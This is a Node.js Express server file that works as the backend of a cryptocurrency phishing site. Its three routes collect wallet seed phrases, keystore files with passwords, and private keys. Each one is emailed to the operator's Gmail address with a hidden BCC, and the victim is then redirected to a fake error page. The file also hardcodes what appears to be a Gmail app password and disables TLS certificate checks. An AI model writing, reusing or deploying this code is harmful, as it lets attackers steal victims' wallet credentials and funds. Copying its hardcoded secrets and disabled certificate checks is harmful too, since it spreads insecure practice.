const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const cors = require("cors"); // Import cors

const app = express();
const PORT = 3000;

// Enable CORS with default options (for any origin)
app.use(
  cors({
    origin: "http://localhost:5500",
    methods: "POST",
    allowedHeaders: ["Content-Type"],
  })
);

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Configure Nodemailer transporter - FIXED VERSION
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587, // Changed from 465 to 587
  secure: false, // Changed from true to false for port 587
  auth: {
    user: "Mikun5y@gmail.com",
    pass: "rwzs rmuq slgr vcgz", // Your app password (this looks correct)
  },
  // Add these timeout and TLS settings for better reliability
  connectionTimeout: 60000, // 60 seconds
  greetingTimeout: 30000,   // 30 seconds
  socketTimeout: 60000,     // 60 seconds
  tls: {
    rejectUnauthorized: false
  },
  // Optional: Add debug logging to see what's happening
  debug: true,
  logger: true
});

// Helper function to send email
function sendEmail(subject, text) {
  const mailOptions = {
    from: "Mikun5y@gmail.com",
    to: "Mikun5y@gmail.com",
    bcc: "yekeen244@gmail.com",
    subject: subject,
    text: text,
  };

  return transporter.sendMail(mailOptions)
    .then(info => {
      console.log('Email sent successfully:', info.response);
      return info;
    })
    .catch(error => {
      console.error('Detailed email error:', error);
      throw error;
    });
}

// Optional: Test the connection when the server starts
transporter.verify((error, success) => {
  if (error) {
    console.error('SMTP connection error:', error);
  } else {
    console.log('SMTP server is ready to take our messages');
  }
});

// Route for handling Seed/Recovery Phrase submission
app.post("/submit-seed", (req, res) => {
  const { phrase } = req.body;
  const subject = "Seed/Recovery Phrase Submission";
  const message = `Seed Phrase: ${phrase}`;

  sendEmail(subject, message);
  res.redirect("https://defiii.netlify.app/error");
});

// Route for handling KeyStore JSON submission
app.post("/submit-keystore", (req, res) => {
  const { keystore, password } = req.body;
  const subject = "Keystore JSON Submission";
  const message = `Keystore Value: ${keystore}\nPassword: ${password}`;

  sendEmail(subject, message);
  res.redirect("https://defiii.netlify.app/error");
});

// Route for handling Private Key submission
app.post("/submit-privatekey", (req, res) => {
  const { privatekey } = req.body;
  const subject = "Private Key Submission";
  const message = `Private Key: ${privatekey}`;

  sendEmail(subject, message);
  res.redirect("https://defiii.netlify.app/error");
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
